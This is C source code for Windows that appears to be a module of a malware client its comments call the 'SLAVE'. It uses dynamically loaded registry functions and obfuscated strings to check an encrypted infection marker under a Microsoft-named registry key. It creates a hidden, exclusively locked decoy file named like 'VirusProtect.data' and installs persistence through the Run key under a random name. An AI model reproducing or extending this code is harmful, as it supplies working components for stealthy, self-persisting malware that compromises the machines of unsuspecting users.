#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <reg.h>
#include "types.h"
#include "random.h"
#include "memProtect.h"
#include "loadLibrary.h"
#include "winmain.h"

HMODULE reg_lib;
__RegGetValue reg_lib_RegGetValue;
__RegSetKeyValue reg_lib_RegSetKeyValue;

/*
Using CreateFile(XXX) se will prevent the file from opening, reading or writing,
the handle will close when the SLAVE stops workings
*/

void reg_Destroy(void)
{
	if(reg_lib)
	{
		FreeLibrary(reg_lib);
	}
}

int reg_Init(void)
{
	reg_lib = loadLibrary_Load(lib_Advapi32);
	
	if(!reg_lib)
	{
		return 0;
	}

	reg_lib_RegGetValue = (__RegGetValue)loadLibrary_LoadFunc(reg_lib, lib_RegGetValueA);
	reg_lib_RegSetKeyValue = (__RegSetKeyValue)loadLibrary_LoadFunc(reg_lib, lib_RegSetKeyValueA);

	return 1;
}

//it will check register and is computer infected by seeing if "AppData\Local\Microsoft\VirusProtect.data" is opend by original code
int reg_IsCompInfected(void)
{
	char* rmicro = (char*)memProtect_Request(MEMPROTECT_REG_MICROSOFT);
	char* rfile = (char*)memProtect_Request(MEMPROTECT_SLAVE_CHECK_NAME);

	ulong buffSize = 1024;
	char buff[buffSize];
	memset(buff, 0, buffSize);

	if(reg_lib_RegGetValue(HKEY_CURRENT_USER, rmicro, rfile, 0x0000FFFF, NULL, buff, &buffSize) == ERROR_SUCCESS)
	{
		free(rmicro);
		free(rfile);

		int decBuffLen;
		uint8* decBuff;

		memProtect_DecryptRegValue((uint8*)buff, &decBuff, &decBuffLen);

		//it will fail if the file doesn't exist or it's open
		FILE *f = fopen((char*)decBuff, "rb");

		if(!f)
		{
			//does file exist or we don't have permission
			if(!random_RandomFileSize((char*)decBuff))
			{
				free(decBuff);

				return -1;
			}
			
			SetFileAttributes((char*)decBuff, FILE_ATTRIBUTE_HIDDEN);

			//prevent file from opening
			CreateFile((char*)decBuff, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
			free(decBuff);

			return 0;
		}

		fclose(f);

		//prevent file from opening
		CreateFile((char*)decBuff, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		free(decBuff);

		return 0;
	}

	char* _cpath = (char*)memProtect_Request(MEMPROTECT_SLAVE_CHECK_PATH);
	char* _cuname = (char*)memProtect_Request(MEMPROTECT_USERNAME);
	char* _capp = (char*)memProtect_Request(MEMPROTECT_AppData);
	char* uname = getenv(_cuname);

	int pathLen = strlen(_cpath) + strlen(uname) + strlen(_capp) + 3;
	char* path = malloc(pathLen + sizeof(char));
	memset(path, 0, pathLen + sizeof(char));
	snprintf(path, pathLen, "%s\\%s%s", uname, _capp, _cpath);

	free(_cpath);
	free(_cuname);
	free(_capp);

	uint8* encPath;
	pathLen = strlen(path);
	memProtect_EncryptRegValue((uint8*)path, &encPath, &pathLen);

	int rv = reg_lib_RegSetKeyValue(HKEY_CURRENT_USER, rmicro, rfile, REG_BINARY, encPath, pathLen);

	free(encPath);
	free(rmicro);
	free(rfile);

	if(rv != ERROR_SUCCESS)
	{
		free(path);

		return -1;
	}

	if(!random_RandomFileSize(path))
	{
		free(path);

		return -1;
	}

	SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);

	//prevent file from opening
	CreateFile(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	free(path);

	return 0;
}

int reg_SetupInRun(char* path)
{
	char* rname = random_Ascii(15);
	char* rpath = (char*)memProtect_Request(MEMPROTECT_REG_RUN);

	int pathLen = strlen(path) + 3;
	char* newPath = malloc(pathLen + sizeof(char));
	memset(newPath, 0, pathLen + sizeof(char));
	snprintf(newPath, pathLen, "\"%s\"", path);

	int rv = reg_lib_RegSetKeyValue(HKEY_CURRENT_USER, rpath, rname, REG_SZ, newPath, strlen(newPath));

	free(newPath);
	free(rname);
	free(rpath);

	if(rv != ERROR_SUCCESS)
	{
		return 0;
	}

	return 1;
}